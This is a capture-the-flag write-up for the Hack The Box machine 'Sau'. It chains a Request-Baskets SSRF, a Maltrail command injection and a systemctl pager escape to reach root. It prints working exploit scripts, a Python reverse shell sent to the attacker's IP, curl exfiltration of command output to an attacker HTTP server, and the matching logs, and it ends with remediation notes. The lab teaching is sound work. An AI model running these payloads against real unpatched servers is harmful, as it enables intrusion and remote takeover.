# HTB - Sau (Complete): 
# IP: 10.10.11.224, sau.htb

# Methodology

...ew > Investigate > Research > Assess > Exploit > Review > Inv...

1. Investigate current levels of access & used technologies
2. Research for code / known vulnerabilities
3. Assess the usefulness of research against target
4. Use research to exploit target
5. Review new levels of access / knowledge gained

While the cycle is best repeated fully it is allowable to break back to step one at any time if issues arrise which prevent progress during the other steps.

# Completed Path
External access > Request-Buckets(SSRF) > Maltrail (RCE) > User access

User access > Systemctl (Privilage Escalation) > Root access
# Investigate

## NMAP
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 11 Aug 2023 16:34:28 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 11 Aug 2023 16:34:03 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 11 Aug 2023 16:34:03 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94%I=7%D=8/11%Time=64D662FB%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2011\x20Aug\x20
SF:2023\x2016:34:03\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2011\x20Aug\x20
SF:2023\x2016:34:03\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options
SF::\x20nosniff\r\nDate:\x20Fri,\x2011\x20Aug\x202023\x2016:34:28\x20GMT\r
SF:\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20nam
SF:e\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\
SF:n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web Content
Filtered site at port 80, port 55555 holds an interesting site however:
### Request-Baskets: 55555
Version: 1.2.1 (newest is 1.2.3)
 
### Request-Baskets(SSRF):55555 -> Maltrail:80
Version: 0.53 (newest is 0.60)

This site is filtered to only allow local traffic to access this port, using the SSRF vulnerability discovered these pages can be accessed through `http://sau.htb:55555/{exploit_bucket}/`

## Internal Access

### Maltrail(RCE) -> Initial Access
Device OS: Linux 
```bash
uname -a
Linux sau 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
Running user: puma
```bash
whoami
puma
```
Shell has spawned in `/opt/maltrail` which seems to be the webroot for the maltrail service exploited. 

The usage of the `puma` user is interesing, there is a puma service that does exist online but i think this is an actual user account due to it having the id 1001 and having a home directory `/home/puma`. This is where the `user.txt` flag exists so i may as well grab it now 
```bash
cat /home/puma/user.txt
072342**************6f7daae
```


# Research
## Requests-Baskets
"Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI." - Github

It is in a sense proxying the web requests sent to the site in some way for logging purposes.

### SSRF [Confirmed]
Unfortunately this version has a SSRF (Server side request forgery) vulnerability which has workable PoC (proof of concepts). e.g. https://github.com/entr0pie/CVE-2023-27163

SSRF is essentially allowing an attacker to create traffic as if it was generated by the victim device.

Why would a SSRF vulnerability be useful here? Because of the filtered web port. There is a possibility that there is indeed a web site running there but it is only acessable via the local device. If this site has a SSRF vulnerability it could be used to gain access to this filtered site.



## Maltrail
"Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails" - Github

While the site is a bit difficult to navigate it should be reasonably easy to use a tool such as gobuster to find any directories hidden, but since the page is nice enough to give out its version number on the home page i may as well google it.

### RCE [Confirmed]
Again, unfortunately this system also has a widely known Command Injection vulnerability with PoC: https://github.com/spookier/Maltrail-v0.53-Exploit

This time the vulnerability may lead to a more severe RCE (Remote Code Execution) vulnerability which if successfully exploited would allow futher internal access to the underlying server and potentially even more vulnerable attack surfaces.

## Initial Access

Having found myself inside a linux box again is good, although i currently only have initial access with a user account, there are many different priviliage escalation bugs which have existed in many different types of Linux environments. 

### Privilage Escalation [Confirmed]

One of the first things i try to find once initial user access has been gained is escalation bugs to attempt to gain root access to this machine, if i do that, this machine is fully under my control and i could even lock access out from the true owners of the machine.

Sometimes, the users of this server have built a method in for us by accident by allowing the user to run select administrative tasks which may be abused. This is checked in the [Assessing](#assess) portion.



# Assess
## Requests-Baskets
The linked github PoC is very simple, simple enough for it to be worth me working through it myself by reviewing the code provided rather than just running it.

```bash
BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");

API_URL="$URL""api/baskets/$BASKET_NAME";

PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";
```

First, the bash script generates a basketname, `LC_ALL=C` sets the device localisation to a "simple locale", unknown if this is needed but as it seems to generate the name from `/dev/urandom`. I may also have to use it.

The script also uses the `tr -dc 'a-z'` command to remove all characters not in the lowecase latin alphabet from the `/dev/urandom` pipe. 

It then uses head to get the first 6 "bytes of the file", i think this may be where the issue lies with unsafe handling of odd characters, as head is splitting on bytes it's possible to end up with weird output such as:

```bash
LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6"
jpbjgc%                                 
```

The `API_URL` variable is pretty easy to understand, as it matches the api calls seen in burp and on the webpage. (/api/baskets/..)

The `PAYLOAD` variable is another key input, the site during normal input requests the end user make a new basket before being able to configure it, whereas the script does it in the same request as the creation of the basket.

The script provided i believe to be a little confusing due to the script naming the accessed site as "attacker server" and the requests-baskets server as the "target", i believe a better name scheme would be "target" for the filtered site, and "vulnerable" for the requests-baskets, so i'll use that in my script provided.

The "attacker" is me but the system is a one way proxy and as such does not require the attacker IP.

As there is direct access to the /dev/urandom device i will also choose to create a simple bash script which creates a proxy basket to the local web server.

The rest of this PoC is pretty useless just some error handling which just makes it a little harder to read. My created PoC is in the [Exploit](#exploit) section.

## Maltrail

Again, the linked PoC seems very simple and so a deconstruction is appropriate.

The main part of the PoC is a one liner and so is broken down for ease of reading.
```python
payload = '''python3 -c 
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{my_ip}",{my_port}));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")
'''

encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
os.system(command)
```

The PoC seems to be injecting a python script (`payload`) into the `username` field by ending the variable assignment with a `;` character.

Using a `;` character indicates to me that this is possibly a linux command injection attack as this is how linux seperates commands out.

The payload is encoded using base64 and piped using `|` (which also indicates linux injection) to decode and piped into `sh` to run a reverse shell to the attacker.

Again, this code was re-written and added onto the previous exploit code, and can also be found in the [Exploit](#exploit) section.

## Initial Access

When checking for privilage escalation 
```bash
puma@sau:/dev/shm$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
An easy way to check if a process can be abused if it is run under sudo is to check [GTFOBins](https://gtfobins.github.io/gtfobins/), it's an extremely useful tool when checking for privilage escalation and lists a large amount of built in programs. 

Shown on the page is indeed a way to exploit systemctl, although there is not one for the specific `systemctl status` function there is one for use on the pager for systemctl (less) which indicates a method of running a command directly from the pager using the `!` exclamation point.

This method is tested in the [Exploit](#exploit) section

# Exploit

## Request-Baskets

```bash
#!/bin/bash
vulnerable="http://sau.htb:55555"; #requests-buckets site
api_path="/api/baskets/"; #api path
target="http://localhost"; #target from the vulnerable site's point of view (localhost here indicates localhost on vulnerable server)
basket=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");

vulnerablebasket="$vulnerable$api_path$basket";
body="{\"forward_url\": \"$target\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";

echo "Creating vulnerable basket...";

curl -s -X POST -H 'Content-Type: application/json' -d "$body" "$vulnerablebasket"; #post request to create basket with params

echo "Access gained via: $vulnerable/$basket"; #link to proxied website
```

```bash
./exploit-rb.sh 
Creating vulnerable basket...
{"token":"s8_UHhIlk_Fd2l0eKuHjZZQDcTBSC0-jZ4gzoElWHw4F"}Access gained via: http://sau.htb:55555/kpcecz
```

And what do we get when we visit that page?
![Maltrail via SSRF](https://github.com/e-war/Writeups/blob/master/HackTheBox/Sau/Images/1.png?raw=true)

Well the css and js haven't loaded at all due to how i'm accessing this page but that is for sure a new website. The bottom left tells us this is a program called "Maltrail", well i think it's time to [review](#review) and then investigate this further.
## Maltrail
Code appended onto previous exploit code.

I seperated out the shellcode from the rest as a lot of the time one liner shellcode sometimes will seem to work with most people's experience but not mine so i tend to bounce around oneliners until one works reliably. Hence the seperation for easy swapout of shellcode.
```bash
echo "Hope you have nc open.. SHELL INCOMING!";
attackerIP="10.10.x.x";
attackerPort=4444;
shellcode='curl "http://'"$attackerIP"':8000/?d=$(/usr/bin/python3+-c+'\''a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("'"$attackerIP"'",'"$attackerPort"'));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")'\'')"'
echo 'username=;`'"$shellcode"'`'
curl "$vulnerable/$basket/login" --data 'username=;`'"$shellcode"'`#'
```

Although they shouldn't really be necessary the ``` ` ``` backtics indicate to the linux command line that the shellcode is to be run, the `#` hash symbol indicates that anything following the injected command should be ignored as a comment.

Working with bactic and different string characters in strings is easier to do with literal strings using `'` single quotes. Variables cannot go in literal strings which is why there are a lot of string characters. 

I Setup a simple HTTP server and chose to wrap my injected commands into a curl to my own http server, this allowed me to run commands and view the stdout of the command, e.g.:
```
10.10.11.224 - - [12/Aug/2023 08:44:21] "GET /?d=puma HTTP/1.1" 200 -
10.10.11.224 - - [12/Aug/2023 08:45:26] "GET /?d= HTTP/1.1" 200 -
10.10.11.224 - - [12/Aug/2023 08:46:03] "GET /?d=Linux HTTP/1.1" 200 -
10.10.11.224 - - [12/Aug/2023 08:47:19] "GET /?d= HTTP/1.1" 200 -
10.10.11.224 - - [12/Aug/2023 08:47:38] "GET /?d= HTTP/1.1" 200 -
10.10.11.224 - - [12/Aug/2023 08:47:51] "GET /?d= HTTP/1.1" 200 -
10.10.11.224 - - [12/Aug/2023 08:48:03] "GET /?d=/usr/bin/cat HTTP/1.1" 200 -
10.10.11.224 - - [12/Aug/2023 08:48:16] "GET /?d=/usr/bin/nc HTTP/1.1" 200 -
```

And when running the script with a `nc` (netcat) listener i see:
![Internal Access](https://github.com/e-war/Writeups/blob/master/HackTheBox/Sau/Images/2.png?raw=true)

## Privilage Escalation
Using the command provided by the `sudo -l` command leads into the `less` pager.

```bash
sudo /usr/bin/systemctl status trail.service
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Sat 2023-08-12 06:25:55 UTC; 2h 26min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 878 (python3)
      Tasks: 31 (limit: 4662)
     Memory: 332.9M
     CGroup: /system.slice/trail.service
             ├─  878 /usr/bin/python3 server.py
             ├─ 1038 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed >
             ├─ 1039 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed >
             ├─ 1042 sh
             ├─ 1045 python3 -c import socket,os,pty;s=socket.socket(socket.AF_>
             ├─ 1046 /bin/sh
             ├─ 1165 script /dev/null -c bash
             ├─ 1166 bash
             ├─ 1182 sudo /usr/bin/systemctl status trail.service
             ├─ 1183 /usr/bin/systemctl status trail.service
             ├─ 1184 pager
             ├─ 1185 sh -c /bin/bash -c sh
             ├─ 1186 sh
             ├─ 1357 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed >
lines 1-23
```
Then typing `!sh`
```bash
             ├─ 1186 sh
             ├─ 1357 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed >
lines 1-23!sh
# 
```
The last # is the input and indicates we have `root` user.
# Review
## Request-Baskets
The public facing attack surface of Requests-Buckets allowed further exploitation of the system by granting access to "internal" services local to the vulnerable device due to the running version being out of date. 

Updating to the newest version is recommended to prevent futher exploitation as proof of concepts are easy to find online anyone could exploit this site using them.

As shown, utilising this vulnerability allows accessing the filtered port 80, this walkthrough now returns to [Investigation](#request-basketsssrf55555---maltrail80)

## Maltrail
Although this service is hidden behind an IP filter it is still accessable due to previous vulnerabilities. Unfortuantely this service also holds a RCE (Remote code execution) vulnerability which allows unauthorised code to run on the victim server.

Again this service is out of date and PoC are easily found, therefore upgrading this version to the newest version will also close this vulnerability.

Now internal access to the machine has been aquired, futher [Investigation](#investigate) is required to see if the machine is vulnerable to internal attacks.

## Initial Access
Once access is gained to the system, an attacker looks for privilage escalation if root access is not already provided. This is to ensure that the attacker has the highest level of privilage to continue on attacking potentially the internal network.

There is not really a reason for the puma user to be able to run systemctl as sudo without a password, if there is a script which requires its use it should be modified to allow only privilaged and authenticated users to read from systemctl.

Now root access has been gained, collecting the flag is as simple as
 ```bash 
 cat /root/root.txt
 ec84067****************62c101
 ```